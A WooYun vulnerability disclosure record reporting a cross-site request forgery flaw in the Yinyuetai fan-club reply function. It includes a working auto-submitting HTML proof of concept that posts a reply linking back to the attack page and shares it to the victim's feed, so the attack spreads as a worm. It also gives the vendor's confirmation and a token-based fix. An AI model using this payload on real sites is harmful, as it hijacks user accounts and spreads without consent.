{"id": 5427, "wybug_id": "wooyun-2014-050098", "wybug_title": "音悦台一处CSRF（2）[已经证明可构造蠕虫]", "wybug_corp": "音悦台", "wybug_author": "我是小号", "wybug_date": "2014-01-31 14:45", "wybug_open_date": "2014-03-17 14:46", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["蠕虫"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-17：\t细节向公众公开  简要描述： 音悦台一处CSRF，已经证明可以蠕动（CSRF的危害也不小啊） 详细说明：  1.先在饭团发个帖，以下面的帖子为例：http://www.yinyuetai.com/fanclub/topic-detail/2682622.然后回复这个帖子，同时抓包，发现是个POST请求，然后我们构造我们的POC如下（自动提交的表单）\n<html><body><form id=\"csrf\" name=\"csrf\" action=\"http://www.yinyuetai.com/fanclub/create-fan-topic-reply\" method=\"POST\"><input type=\"text\" name=\"fid\" value=\"514\" /><input type=\"text\" name=\"topicId\" value=\"268262\" /><input type=\"text\" name=\"editorUploadType\" value=\"fan_topic_reply\" /><input type=\"text\" name=\"isTopic\" value=\"false\" /><input type=\"text\" name=\"isSynI\" value=\"true\" /><input type=\"text\" name=\"isSynIChange\" value=\"true\" /><input type=\"text\" name=\"replContent\" value=\"<p>Click Here：http://t.cn/8FJAIp9</p>\"/><input type=\"submit\" value=\"submit\" /></form><script>\tdocument.csrf.submit();</script></body></html>\n注释:这个POC的作用为以用户ID在这个帖子发一个回复，内容是：\nhttp://t.cn/8FJAIp9\n上面的链接指向带有上面POC代码的网页，同时将这个回帖转到我的家用户的动态中。3.下面的情况可想而知了，一个用户中招，同时在这位用户的“我的家”分享了CSRF攻击网址的链接，不断有用户看到好友的动态，然后点击中招，不断传播。   漏洞证明：  1.\n\n2.回到我的家发现已经发了这么多动态了。\n\n   修复方案：  饭团回帖处加TOKEN   版权声明：转载请注明来源 我是小号@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-01-31 15:39 厂商回复： 对于发帖内容有html过滤，但的确欠考虑，感谢提醒 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-31 15:40 |    \t\t我是小号 \t\t\t( 普通白帽子  |\t\t\t        Rank:334 漏洞数:51        | Martin)\t\t \n  @音悦台 不急，我还有3    \n     2014-03-17 21:21 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  连载么   坐等     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}